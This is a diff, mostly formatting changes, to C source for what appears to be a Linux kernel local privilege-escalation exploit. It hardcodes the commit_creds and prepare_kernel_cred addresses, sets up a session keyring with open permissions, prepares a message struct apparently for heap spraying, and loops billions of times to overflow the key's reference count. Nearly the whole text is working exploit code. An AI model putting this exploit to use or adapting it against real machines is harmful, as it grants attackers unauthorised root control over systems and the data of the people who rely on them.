@@ -26,8 +26,6 @@ _prepare_kernel_cred prepare_kernel_cred;
 #define COMMIT_CREDS_ADDR (0xffffffff81094250)
 #define PREPARE_KERNEL_CREDS_ADDR (0xffffffff81094550)
 
-
-
 struct key_type {
     char * name;
     size_t datalen;
@@ -47,22 +45,22 @@ void userspace_revoke(void * key) {
 }
 
 int main(int argc, const char *argv[]) {
-	const char *keyring_name;
-	size_t i = 0;
+    const char *keyring_name;
+    size_t i = 0;
     unsigned long int l = 0x100000000/2;
-	key_serial_t serial = -1;
-	pid_t pid = -1;
+    key_serial_t serial = -1;
+    pid_t pid = -1;
     struct key_type * my_key_type = NULL;
     
-struct { long mtype;
+    struct { long mtype;
 		char mtext[STRUCT_LEN];
-	} msg = {0x4141414141414141, {0}};
-	int msqid;
+    } msg = {0x4141414141414141, {0}};
+    int msqid;
 
-	if (argc != 2) {
-		puts("usage: ./keys <key_name>");
-		return 1;
-	}
+    if (argc != 2) {
+        puts("usage: ./keys <key_name>");
+        return 1;
+    }
 
     printf("uid=%d, euid=%d\n", getuid(), geteuid()); 
     commit_creds = (_commit_creds) COMMIT_CREDS_ADDR;
@@ -88,21 +86,20 @@ struct { long mtype;
 
     keyring_name = argv[1];
 
-	/* Set the new session keyring before we start */
+    /* Set the new session keyring before we start */
 
-	serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name);
-	if (serial < 0) {
-		perror("keyctl");
-		return -1;
+    serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name);
+    if (serial < 0) {
+        perror("keyctl");
+        return -1;
     }
 	
-	if (keyctl(KEYCTL_SETPERM, serial, KEY_POS_ALL | KEY_USR_ALL | KEY_GRP_ALL | KEY_OTH_ALL) < 0) {
-		perror("keyctl");
-		return -1;
-	}
+    if (keyctl(KEYCTL_SETPERM, serial, KEY_POS_ALL | KEY_USR_ALL | KEY_GRP_ALL | KEY_OTH_ALL) < 0) {
+	perror("keyctl");
+	return -1;
+    }
 
-
-	puts("Increfing...");
+    puts("Increfing...");
     for (i = 1; i < 0xfffffffd; i++) {
         if (i % 50000 == 0) {
             printf("%lf %%\r",(float)i*100/0xfffffffd);
